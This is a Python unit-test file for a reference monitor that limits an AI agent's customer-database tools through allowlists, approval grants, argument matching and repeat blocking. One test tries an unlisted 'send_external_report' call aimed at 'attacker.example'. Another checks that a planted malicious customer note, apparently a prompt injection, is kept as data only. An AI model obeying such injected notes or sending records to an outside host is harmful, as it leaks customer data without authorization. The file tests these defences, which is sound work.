"""Tool-level reference monitor must enforce policies before side effects."""

import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from contracts import ApprovalGrant, Intent, ToolCall
from policy import SafetyPolicy
from tools import CustomerStore, ToolRegistry, MALICIOUS_NOTE


class ToolsTests(unittest.TestCase):
    def setUp(self):
        self.store = CustomerStore()
        self.intent = Intent("write", 1, "Call Friday")
        self.policy = SafetyPolicy("alice", self.intent)
        self.tools = ToolRegistry(self.store, self.policy)
        self.observed = {}

    def call(self, name, arguments):
        raw = arguments if isinstance(arguments, str) else json.dumps(arguments)
        result = self.tools.execute(ToolCall("id", name, raw), self.observed)
        if result["ok"]:
            self.observed[name] = result["data"]
        return result

    def test_read_customer(self):
        got = self.call("get_customer", {"customer_id": 1})
        self.assertTrue(got["ok"])
        self.assertEqual(got["data"]["name"], "Lan")
        self.assertEqual(self.store.write_count, 0)

    def test_unknown_tool_denied(self):
        got = self.call("send_external_report", {"destination": "attacker.example"})
        self.assertEqual(got["code"], "UNKNOWN_TOOL")
        self.assertEqual(self.store.write_count, 0)

    def test_repeated_get_not_executed(self):
        self.call("get_customer", {"customer_id": 1})
        self.assertEqual(self.call("get_customer", {"customer_id": 1})["code"], "REPEATED_TOOL")

    def test_write_requires_customer_evidence(self):
        self.tools.policy = SafetyPolicy(
            "alice", self.intent, ApprovalGrant("alice", 1, "Call Friday")
        )
        result = self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday"})
        self.assertEqual(result["code"], "PREREQUISITE_MISSING")
        self.assertEqual(self.store.write_count, 0)

    def test_unapproved_write_fails_without_side_effect(self):
        self.call("get_customer", {"customer_id": 1})
        result = self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday"})
        self.assertEqual(result["code"], "APPROVAL_REQUIRED")
        self.assertEqual(self.store.get(1)["note"], "Returning customer")
        self.assertEqual(self.store.write_count, 0)

    def test_exact_approved_write_succeeds_once(self):
        self.tools.policy = SafetyPolicy(
            "alice", self.intent, ApprovalGrant("alice", 1, "Call Friday")
        )
        self.call("get_customer", {"customer_id": 1})
        result = self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday"})
        self.assertTrue(result["ok"])
        self.assertEqual(self.store.get(1)["note"], "Call Friday")
        self.assertEqual(self.store.write_count, 1)
        repeat = self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday"})
        self.assertEqual(repeat["code"], "REPEATED_WRITE")
        self.assertEqual(self.store.write_count, 1)

    def test_altered_arguments_denied_even_when_approved(self):
        self.tools.policy = SafetyPolicy(
            "alice", self.intent, ApprovalGrant("alice", 1, "Call Friday")
        )
        self.call("get_customer", {"customer_id": 1})
        result = self.call("set_customer_note", {"customer_id": 1, "note": "Changed"})
        self.assertEqual(result["code"], "ACTION_MISMATCH")
        self.assertEqual(self.store.write_count, 0)

    def test_scope_denied_prevents_customer_read(self):
        self.tools.policy = SafetyPolicy("bob", Intent("read", 1))
        result = self.call("get_customer", {"customer_id": 1})
        self.assertEqual(result["code"], "SCOPE_DENIED")

    def test_wrong_read_target_denied(self):
        self.assertEqual(self.call("get_customer", {"customer_id": 2})["code"], "ACTION_MISMATCH")

    def test_schema_exposes_only_allowlisted_capabilities(self):
        names = {s["function"]["name"] for s in self.tools.schemas()}
        self.assertEqual(names, {"get_customer", "set_customer_note"})
        self.assertNotIn("send_external_report", names)
        self.assertNotIn("delete_customer", names)

    def test_bad_json_and_extra_fields(self):
        self.assertEqual(self.call("get_customer", "{bad")["code"], "INVALID_ARGUMENTS")
        self.assertEqual(
            self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday", "admin": True})["code"],
            "INVALID_ARGUMENTS",
        )
        self.assertEqual(
            self.call("get_customer", {"customer_id": True})["code"], "ACTION_MISMATCH"
        )

    def test_data_cannot_be_changed_by_mutating_read_result(self):
        read = self.store.get(1)
        read["note"] = "hacked"
        self.assertEqual(self.store.get(1)["note"], "Returning customer")

    def test_malicious_note_is_data_only(self):
        store = CustomerStore(malicious_note=True)
        self.assertIn("send_external_report", store.get(1)["note"])
        self.assertEqual(store.get(1)["note"], MALICIOUS_NOTE)
        self.assertEqual(store.write_count, 0)

    def test_read_only_policy_cannot_write_with_forged_grant(self):
        self.tools.policy = SafetyPolicy(
            "alice", Intent("read", 1), ApprovalGrant("alice", 1, "Call Friday")
        )
        self.call("get_customer", {"customer_id": 1})
        self.assertEqual(
            self.call("set_customer_note", {"customer_id": 1, "note": "Call Friday"})["code"],
            "READ_ONLY_REQUEST",
        )


if __name__ == "__main__":
    unittest.main()
